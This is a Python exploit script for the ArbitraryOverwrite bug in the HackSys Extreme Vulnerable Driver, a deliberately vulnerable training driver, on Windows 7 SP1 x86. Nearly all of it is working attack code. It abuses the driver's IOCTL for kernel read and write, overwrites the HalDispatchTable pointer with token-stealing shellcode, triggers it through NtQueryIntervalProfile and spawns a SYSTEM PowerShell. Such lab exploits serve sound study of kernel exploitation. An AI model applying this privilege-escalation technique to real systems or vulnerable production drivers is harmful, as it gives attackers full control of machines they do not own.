#!/usr/bin/python
#
# HEVD v1.20 ArbitraryOverwrite exploit for Windows 7 SP1 x86 by @acru3l.
#

import sys
import struct
from ctypes import *

device_name = r'\\.\HackSysExtremeVulnerableDriver'

# assembled with WinDBG
shellcode = ''
shellcode += '\x60'                             # pushad
shellcode += '\x31\xc0'                         # xor     eax,eax
shellcode += '\x64\x8b\x80\x24\x01\x00\x00'     # mov     eax,dword ptr fs:[eax+124h] ; 0x124 = offset nt!_KPCR.PcrbData.CurrentThread
shellcode += '\x8b\x40\x50'                     # mov     eax,dword ptr [eax+50h]     ; 0x50 = offset nt!_KTHREAD.ApcState.Process
shellcode += '\x8b\xc8'                         # mov     ecx,eax
shellcode += '\xba\x04\x00\x00\x00'             # mov     edx,4
shellcode += '\x8b\x80\xb8\x00\x00\x00'         # mov     eax,dword ptr [eax+0B8h]    ; 0xB8 = offset nt!_EPROCESS.ActiveProcessLinks.Flink
shellcode += '\x2d\xb8\x00\x00\x00'             # sub     eax,0B8h
shellcode += '\x39\x90\xb4\x00\x00\x00'         # cmp     dword ptr [eax+0B4h],edx    ; 0xB4 = offset nt!_EPROCESS.UniqueProcessId
shellcode += '\x75\xed'                         # jne     $-17
shellcode += '\x8b\x90\xf8\x00\x00\x00'         # mov     edx,dword ptr [eax+0F8h]    ; 0xF8 = offset nt!_EPROCESS.Token
shellcode += '\x89\x91\xf8\x00\x00\x00'         # mov     dword ptr [ecx+0F8h],edx
shellcode += '\x61'                             # popad
shellcode += '\xc2\x10\x00'                     # ret     10h                         ; HalQuerySystemInformation takes 4 arguments

def get_kernel_base():
    '''
    find base address of the kernel via EnumDeviceDrivers
    '''
    array = c_uint * 0x400
    addr = array()
    
    res = windll.psapi.EnumDeviceDrivers(byref(addr),
                                    sizeof(addr),
                                    byref(c_uint(0)))
    if not res:
        return None
    
    # Kernel is the first entry of the result
    return addr[0]

def get_device_name(addr):
    '''
    find file name of kernel via GetDeviceDriverBaseNameA
    '''
    buff = create_string_buffer(0x400)
    
    res = windll.psapi.GetDeviceDriverBaseNameA(addr,
                                    buff,
                                    sizeof(buff))
    if res == 0:
        return None
    
    return buff[:res]

def read_dword(addr):
    '''
    read dword from addr abusing the vulnerability
    '''
    res = c_uint(0)
    obj = struct.pack('<L', addr) + \
          struct.pack('<L', addressof(res))
    
    ioctl_code = 0x22200B   # call ArbitraryOverwriteIoctlHandler
    windll.kernel32.DeviceIoControl(hFile,
                                    ioctl_code,
                                    obj,
                                    len(obj),
                                    0,
                                    0,
                                    byref(c_int(0)),
                                    0)
    return res.value

def write_dword(addr, value):
    '''
    write value to addr abusing the vulnerability
    '''
    val = c_uint(value)
    obj = struct.pack('<L', addressof(val)) + \
          struct.pack('<L', addr)
    
    ioctl_code = 0x22200B   # call ArbitraryOverwriteIoctlHandler
    windll.kernel32.DeviceIoControl(hFile,
                                    ioctl_code,
                                    obj,
                                    len(obj),
                                    0,
                                    0,
                                    byref(c_int(0)),
                                    0)

hFile = windll.kernel32.CreateFileA(device_name,
                                0xC0000000,     # GENERIC_READ | GENERIC_WRITE
                                0x00000001,     # FILE_SHARE_READ
                                0,              # NULL
                                3,              # OPEN_EXISTING
                                0x80,           # FILE_ATTRIBUTE_NORMAL
                                0)              # NULL

if hFile == -1:
    print '[-] Failed to open device: %s' % device_name
    sys.exit(1)
print '[+] Device opened successfully: %s' % device_name

# 1. find HalDispatchTable
base_addr = get_kernel_base()
if not base_addr:
    print '[-] Failed to obtain Kernel base'
    sys.exit(1)
print '[+] Kernel base address: 0x%08x' % base_addr

kernel_name = get_device_name(base_addr)
if not kernel_name:
    print '[+] Failed to obtain Kernel name'
    sys.exit(1)
print '[+] Kernel name: %s' % kernel_name

hModule = windll.kernel32.LoadLibraryA(kernel_name)
if hModule == 0:
    print '[-] Failed to load Kernel image: %s' % kernel_name
    sys.exit(1)
print '[+] Kernel image loaded: 0x%08x' % hModule

disp_table = windll.kernel32.GetProcAddress(hModule, 'HalDispatchTable')
if disp_table == 0:
    print '[-] Failed to find HalDispatchTable'
    sys.exit(1)

# 2. patch HalQuerySystemInformation
disp_table_kernel = base_addr - hModule + disp_table
print '[+] HalDispatchTable is at: 0x%08x' % disp_table_kernel

print '[+] Patching pointer to HalQuerySystemInformation'

query_sysinfo = read_dword(disp_table_kernel + 4)
print '[+] HalQuerySystemInformation: 0x%08x' % query_sysinfo

shellcode_buffer = windll.kernel32.VirtualAlloc(0,
                                len(shellcode),
                                0x00003000,     # MEM_COMMIT | MEM_RESERVE
                                0x40)           # PAGE_EXECUTE_READWRITE

if shellcode_buffer == 0:
    print '[-] Failed to allocate shellcode'
    sys.exit(1)
print '[+] Shellcode allocated at 0x%08x' % shellcode_buffer

memmove(shellcode_buffer, shellcode, len(shellcode))

write_dword(disp_table_kernel + 4, shellcode_buffer)

# 3. call NtQueryIntervalProfile
print '[+] Calling shellcode via NtQueryIntervalProfile'

interval = c_uint(0)
windll.ntdll.NtQueryIntervalProfile(2,          # any value other than 0 or 1
                                byref(interval))

# 4. restore HalQuerySystemInformation
print '[+] Restoring HalQuerySystemInformation'

write_dword(disp_table_kernel + 4, query_sysinfo)

# Got SYSTEM shell?
import os
os.system("powershell.exe")
